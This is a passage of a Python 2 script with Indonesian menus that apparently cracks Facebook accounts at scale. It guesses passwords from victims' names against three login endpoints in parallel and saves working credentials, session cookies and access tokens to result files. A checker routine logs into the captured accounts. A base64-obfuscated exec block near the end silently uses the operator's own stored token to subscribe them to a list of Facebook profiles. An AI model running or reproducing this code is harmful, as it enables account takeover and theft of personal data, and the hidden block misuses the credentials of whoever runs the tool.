            	print ("\r\033[0;91m• IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                loop +=1
                api(self, user, xxh)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print ('\r %s*--> %s ◊ %s ◊ %s   ' % (H,user,pw,response.json()['access_token']))
                wrt = ' *--> %s ◊ %s ◊ %s ' % (user,pw,response.json()['access_token'])
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    wrt = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
                wrt = ' *--> %s ◊ %s' % (user,pw)
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def mbasic(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki))
                wrt = (' *--> %s ◊ %s ◊ %s' % (user,pw,kuki))
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt'% (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print ('\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year))
                    wrt = (' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year))
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print ('\r %s*--> %s ◊ %s           ' % (K,user,pw))
                wrt = (' *--> %s ◊ %s' % (user,pw))
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def mobile(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for mi in b('input'):
            	if mi.get('value') is None:
            	    if mi.get('name') == 'email':
            	        data.update({"email":user})
                    elif mi.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({mi.get('name'): ''})
                else:
                	data.update({mi.get('name'): mi.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
                wrt = ' *--> %s ◊ %s ◊ %s' % (user,pw,kuki)
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    wrt = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
                wrt = ' *--> %s ◊ %s' % (user,pw)
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def sung(self):
        ii = raw_input('\n%s#%s Pilih %s>%s '%(P,O,M,K))
        if ii == '':
            print '\n%s%s isi yang benar '%(M,til);self.sung()
        elif ii in ('1', '01'):
            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
            with Lampung(max_workers=30) as njir:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        njir.submit(self.api, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        elif ii in ('2', '02'):
            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
            with Lampung(max_workers=30) as njir:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        njir.submit(self.mbasic, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        elif ii in ('3', '03'):
            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
            with Lampung(max_workers=30) as njir:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        njir.submit(self.mobile, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        else:
            print '\n%s%s isi yang benar'%(M,til);self.sung()
  
# CEK OPSI
def opsi():
	hasil = ("hasil/")
	print("\n%s%s%s Masukan file [ ex%s: %sCP-%s-%s-%s.txt%s ]"%(U,til,O,M,K,ha,op,ta,O))
	romi = raw_input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s isi yang benar "%(M,til));jeda(2);opsi()
	try:
		file_cp = open(hasil+romi, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print("%s%s%s Total akun %s: %s%s"%(U,til,O,M,P,len(file_cp)));jeda(2)
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		print("\n%s%s%s cek akun %s: %s%s"%(U,til,O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n%s%s%s Selesai "%(U,til,O));jeda(0.07)
	raw_input("%s%s%s kembali "%(U,til,O));jeda(0.07)
	menu()
	
def mengecek(user, pw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		apk = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print("%s%s Berhasil ◊ %s "%(H,til,kuki));jeda(0.07)
		print("%s%s%s Aplikasi terhubung %s: %s%s"%(U,til,O,M,H,str(len(apk))))
		nomer = 0
		for app in apk:
			nomer += 1
			print("  %s%s. %s%s, %s"%(P,str(nomer),H,app[0][0],app[0][1]))
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		sesi = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in sesi.find_all("option")]
		print("%s%s%s terdapat %s0%s%s opsi %s: "%(U,til,O,P,str(len(ngew)),O,M));jeda(0.07)
		for opt in range(len(ngew)):
			jalan("  %s0%s. %s%s "%(P,str(opt+1),K,ngew[opt]))
	elif "login_error" in str(run):
		eror = run.find("div",{"id":"login_error"}).find("div").text
		print("%s%s %s"%(M,til,eror));jeda(0.07)
	else:
		print("%s%s login gagal, silahkan cek kembali id dan password"%(M,til));jeda(0.07)
		
# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('data/token.txt', 'r').read()
    except IOError:
        print ("%s%s Token invalid "%(M,til));jeda(2);os.system('rm -rf data/token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print ("%s%s Token invalid "%(M,til));jeda(2);os.system('rm -rf data/token.txt');masuk()
    except requests.exceptions.ConnectionError:
        exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
    banner()
    print ('%s # %sName %s: %s%s%s \n'%(U,O,M,H,nama,O))
    print ('%s%s%s 01 %sDump id public'%(U,til,P,O))
    print ('%s%s%s 02 %sDump id followers'%(U,til,P,O))
    print ('%s%s%s 03 %sDump id reaction post'%(U,til,P,O))
    print ('%s%s%s 04 %sDump id anggota groups'%(U,til,P,O))
    print ('%s%s%s 05 %sDump id pencarian nama'%(U,til,P,O))
    print ('%s%s%s 06 %sDump id pesan mesengger'%(U,til,P,O))
    print ('%s%s%s 07 %sStart crack'%(U,til,H,O))
    print ('%s%s%s 08 %sGanti user agent'%(U,til,P,O))
    print ('%s%s%s 09 %sCek hasil crack'%(U,til,P,O))
    print ('%s%s%s 10 %sCek opsi akun'%(U,til,P,O))
    #print ('%s%s%s 11 %sInfo script'%(U,til,P,O))
    print ('%s%s%s rm %sHapus akun'%(U,til,P,O))
    print ('%s%s%s 00 %sKeluar'%(U,til,M,O))
    slut = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
    if slut == '':
        print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
    elif slut in['1','01']:
        publik(romz)
    elif slut in['2','02']:
        followers(romz)
    elif slut in['3','03']:
        postingan(romz)
    elif slut in['4','04']:
        group(__romz__())
    elif slut in['5','05']:
    	dumpfl();exit()
    elif slut in['6','06']:
    	pesan(__romz__())
    elif slut in['7','07']:
        ngentod().askk()
    elif slut in['8','08']:
    	useragent()
    elif slut in['9','09']:
        try:
            dirs = os.listdir("hasil")
            for file in dirs:
                print("%s%s%s> %s%s"%(U,til,M,O,file));jeda(0.2)
            file = raw_input("\n%s%s%s masukan file %s:%s "%(U,til,O,M,O));jeda(0.2)
            if file == "":
                print("%s%s file tidak ada "%(M,til))
            total = open("hasil/%s"%(file)).read().splitlines()
            print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            ttl_file  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan("%s%s%s Crack tanggal %s:%s%s %stotal %s: %s%s"%(U,til,O,M,P,ttl_file,O,M,P,len(total)))
            print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
            for akun in total:
            	fb = akun.replace("\n","")
                tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
                print(tling);jeda(0.03)
            print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
            raw_input('\n%s%s%s kembali '%(U,til,O));menu()
        except (IOError):
            print("\n%s%s tidak ada hasil :("%(M,til))
            raw_input('\n%s%s%s kembali '%(U,til,O));menu()
    elif slut in['10']:
    	opsi()
    elif slut in['11']:
        print(ingfo)
    elif slut in['rm','Rm','RM']:
        print ('')
        tik();jeda(1);os.system('rm -rf data/token.txt')
        os.system('rm -rf .cok')
        jalan('\n%s%s berhasil terhapus '%(H,til));exit()
    elif slut in['0','00']:
    	exit('\n')
    else:
        print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
 
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))

if __name__ == '__main__':
    os.system('git pull')
    menu()